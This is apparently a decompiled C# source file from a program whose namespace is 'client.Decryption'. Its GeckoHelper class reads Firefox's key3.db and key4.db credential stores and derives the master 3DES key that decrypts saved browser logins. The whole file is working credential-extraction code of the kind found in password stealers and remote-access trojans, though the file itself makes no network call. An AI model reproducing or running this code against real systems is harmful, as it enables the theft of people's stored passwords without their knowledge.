using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;

namespace client.Decryption
{
	// Token: 0x0200002F RID: 47
	internal class GeckoHelper
	{
		// Token: 0x06000127 RID: 295 RVA: 0x000052B4 File Offset: 0x000034B4
		public static byte[] HexToBytes(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				return null;
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x06000128 RID: 296 RVA: 0x00005308 File Offset: 0x00003508
		public static byte[] Key3(byte[] path)
		{
			byte[] result;
			try
			{
				Asn1Der asn1Der = new Asn1Der();
				BerkeleyDatabase berkeleyDatabase = new BerkeleyDatabase(path);
				string text = berkeleyDatabase.Keys.Where(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Key.Equals("password-check");
				}).Select(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Value;
				}).FirstOrDefault<string>().Replace("-", "");
				int num = int.Parse(text.Substring(2, 2), NumberStyles.HexNumber) * 2;
				string hexString = text.Substring(6, num);
				int num2 = text.Length - (6 + num + 36);
				text.Substring(6 + num + 36, num2);
				string hexString2 = text.Substring(6 + num + 4 + num2);
				string hexString3 = berkeleyDatabase.Keys.Where(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Key.Equals("global-salt");
				}).Select(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Value;
				}).FirstOrDefault<string>().Replace("-", "");
				TripleDES tripleDES = new TripleDES(GeckoHelper.HexToBytes(hexString3), Encoding.ASCII.GetBytes(""), GeckoHelper.HexToBytes(hexString));
				tripleDES.Compute_void();
				if (!TripleDESHelper.DESCBC_Decrypt_String(tripleDES.key, tripleDES.IV, GeckoHelper.HexToBytes(hexString2)).StartsWith("password-check"))
				{
					result = null;
				}
				else
				{
					string hexString4 = (from p in berkeleyDatabase.Keys
					where !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check")
					select p.Value).FirstOrDefault<string>().Replace("-", "");
					Asn1DerObject asn1DerObject = asn1Der.Parse(GeckoHelper.HexToBytes(hexString4));
					TripleDES tripleDES2 = new TripleDES(GeckoHelper.HexToBytes(hexString3), Encoding.ASCII.GetBytes(""), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
					tripleDES2.Compute_void();
					byte[] toparse = TripleDESHelper.DESCBC_Decrypt_Byte(tripleDES2.key, tripleDES2.IV, asn1DerObject.objects[0].objects[1].Data);
					Asn1DerObject asn1DerObject2 = asn1Der.Parse(toparse);
					Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.objects[0].objects[2].Data);
					byte[] array = new byte[24];
					if (asn1DerObject3.objects[0].objects[3].Data.Length > 24)
					{
						Array.Copy(asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.Length - 24, array, 0, 24);
					}
					else
					{
						array = asn1DerObject3.objects[0].objects[3].Data;
					}
					result = array;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000129 RID: 297 RVA: 0x00005678 File Offset: 0x00003878
		public static byte[] Key4(byte[] path)
		{
			byte[] result = null;
			Asn1Der asn1Der = new Asn1Der();
			SQLHelper sqlhelper = new SQLHelper(path);
			sqlhelper.ReadTable("metaData");
			for (int i = 0; i < sqlhelper.GetRowCount(); i++)
			{
				if (!(sqlhelper.GetValue(i, "id") != "password"))
				{
					byte[] globalsalt = new byte[0];
					try
					{
						globalsalt = Encoding.Default.GetBytes(sqlhelper.GetValue(i, 1));
						byte[] bytes = Encoding.Default.GetBytes(sqlhelper.GetValue(i, 2));
						Asn1DerObject asn1DerObject = asn1Der.Parse(bytes);
						string text = asn1DerObject.ToString();
						if (text.Contains("2A864886F70D010C050103"))
						{
							byte[] data = asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data;
							byte[] bytes2 = new TripleDES(asn1DerObject.objects[0].objects[1].Data, globalsalt, Encoding.ASCII.GetBytes(""), data).Compute();
							if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes2).StartsWith("password-check"))
							{
								goto IL_3A8;
							}
						}
						else if (text.Contains("2A864886F70D01050D"))
						{
							byte[] data2 = asn1DerObject.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
							byte[] data3 = asn1DerObject.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
							byte[] bytes3 = new PBE(asn1DerObject.objects[0].objects[0].objects[1].objects[3].Data, globalsalt, Encoding.ASCII.GetBytes(""), data2, data3).Compute();
							if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes3).StartsWith("password-check"))
							{
								goto IL_3A8;
							}
						}
						else if (!text.Contains("2A864886F70D010C050103") && !text.Contains("2A864886F70D01050D"))
						{
							goto IL_3A8;
						}
					}
					catch
					{
					}
					try
					{
						SQLHelper sqlhelper2 = new SQLHelper(path);
						sqlhelper2.ReadTable("nssPrivate");
						for (int j = 0; j < sqlhelper2.GetRowCount(); j++)
						{
							byte[] bytes4 = Encoding.Default.GetBytes(sqlhelper2.GetValue(j, "a11"));
							Asn1DerObject asn1DerObject2 = asn1Der.Parse(bytes4);
							byte[] data4 = asn1DerObject2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
							byte[] data5 = asn1DerObject2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
							Array sourceArray = new PBE(asn1DerObject2.objects[0].objects[0].objects[1].objects[3].Data, globalsalt, Encoding.ASCII.GetBytes(""), data4, data5).Compute();
							byte[] array = new byte[24];
							Array.Copy(sourceArray, array, array.Length);
							result = array;
						}
					}
					catch
					{
					}
				}
				IL_3A8:;
			}
			return result;
		}
	}
}
